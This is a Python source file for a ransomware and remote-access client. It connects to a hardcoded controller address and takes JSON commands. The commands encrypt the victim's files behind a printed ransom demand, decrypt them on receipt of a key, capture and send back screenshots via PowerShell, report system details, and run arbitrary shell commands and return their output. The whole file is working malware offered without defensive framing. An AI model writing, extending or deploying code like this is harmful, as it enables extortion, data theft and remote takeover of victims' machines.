from datetime import datetime
import json
import socket
import subprocess
import psutil
import time
import platform
from pathlib import Path
import encrypt
import decrypt
from colorama import Fore, Style
import threading
import sys
import os



def main():
    SERVER = '192.168.100.250'
    BINDING_PORT = 1234
    ADDR = (SERVER, BINDING_PORT)


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(ADDR)
        
        while True:
            message = client_socket.recv(4096).decode()
            
            if not message:
                break
            try:
                data = json.loads(message)
                command = data.get("type")
                msg = data.get("content")

            except ValueError:
                continue
            if command == "exit":
                exit_message = {"Exiting": "Client is exiting..."}
                client_socket.sendall(json.dumps(exit_message).encode())
                time.sleep(3)
                break
            
            
            
            
            
            elif command == "send":
                print(f"Message from my CREATOR: {msg}")
                
                
                
                
            
            elif command == "encrypt":
                input_path = msg if msg else "."
                encryption_msg = encrypt.encrypt_files_in(input_path)
                ransome_msg = f"your files inside {input_path} have been encrypted, pay 1000$ to get the key"
                print(ransome_msg)
                client_socket.sendall(json.dumps({"Encryption Info": encryption_msg}).encode())
                
                
                
            elif command == "decrypt":
                msg, key = msg.split("|", 1)
                input_path = msg if msg else "."
                decryption_msg = decrypt.decrypt_files_in(input_path, key)
                congratulation_msg = f"Congratulations! Your files are decrypted, {decryption_msg}"
                print(congratulation_msg)
                client_socket.sendall(json.dumps({"message": decryption_msg}).encode())
                
                
                
                
            elif command == "scrnsht":
                try:
                    result = subprocess.run([
                    "powershell",
                    "-Command",  
                    "Add-Type -AssemblyName System.Windows.Forms; "
                    "Add-Type -AssemblyName System.Drawing; "
                    "$s=[Windows.Forms.Screen]::PrimaryScreen; "
                    "$b=New-Object Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); "
                    "$g=[Drawing.Graphics]::FromImage($b); "
                    "$g.CopyFromScreen($s.Bounds.Location,[Drawing.Point]::Empty,$s.Bounds.Size); "
                    "$b.Save('screenshot.png',[Drawing.Imaging.ImageFormat]::Png); "
                    "$g.Dispose(); $b.Dispose()"          
                ], capture_output=True, text=True)

                    if result.returncode != 0:
                        raise RuntimeError(result.stderr)

                    screenshot = Path("screenshot.png")

                    if not screenshot.exists():
                        client_socket.sendall(json.dumps({"error": "screenshot.png was not created"}).encode())

                    client_socket.sendall(json.dumps({"message": f"Screenshot created: {screenshot.resolve()}"}).encode())
                    client_socket.sendall(json.dumps({"size": f"Size: {screenshot.stat().st_size} bytes"}).encode())
                    client_socket.sendall(screenshot.read_bytes())
                except Exception as e:
                    client_socket.sendall(json.dumps({"error": str(e)}).encode())
                    
                    
                    
                    
                    
            elif command == "Basicinfo":
                try:
                    cpu_percent = psutil.cpu_percent(interval=1)
                    memory_info = psutil.virtual_memory()
                    disk_info = psutil.disk_usage('/')

                    basic_info = {
                        "CPU Usage": f"{cpu_percent}%",
                        "CPU Cores": psutil.cpu_count(logical=True),
                        
                        "Memory Usage": f"{memory_info.percent}%",
                        "Memory Total": f"{memory_info.total / (1024**3):.2f} GB",
                        "Memory Available": f"{memory_info.available / (1024**3):.2f} GB",

                        "Disk Usage": f"{disk_info.percent}%",
                        "Disk Total": f"{disk_info.total / (1024**3):.2f} GB",
                        "Disk Free": f"{disk_info.free / (1024**3):.2f} GB",

                        "Hostname": socket.gethostname(),
                        "Operating System": platform.system(),
                        "OS Version": platform.version(),

                        "Boot Time": datetime.fromtimestamp(
                            psutil.boot_time()
                        ).strftime("%Y-%m-%d %H:%M:%S")
                    }
                    client_socket.sendall(json.dumps(basic_info).encode())
                except Exception as e:
                    error_message = {"error": str(e)}
                    client_socket.send(json.dumps(error_message).encode())
                
                
                
                
                
                
            elif command == "cmd":
                ind = 0
                while ind < len(msg.split("/n")):
                    try:
                        msg = msg.split("/n")[ind]
                        output = json.dumps({"output": subprocess.check_output(msg, shell=True, stderr=subprocess.STDOUT, text=True)})
                        client_socket.send(output.encode())  # send as bytes
                        ind += 1
                    except subprocess.CalledProcessError as e:
                        error_message = {"error": str(e)}
                        client_socket.send(json.dumps(error_message).encode())
                
            else:
                error_message = {"error": f"Unknown command: {command}"}
                client_socket.send(json.dumps(error_message).encode())   

def run_client():
    thread = threading.Thread(
        target=main,
        daemon=True
    )
    thread.start()


if __name__ == "__main__":
    run_client()
    while True:
        time.sleep(1)
            
        
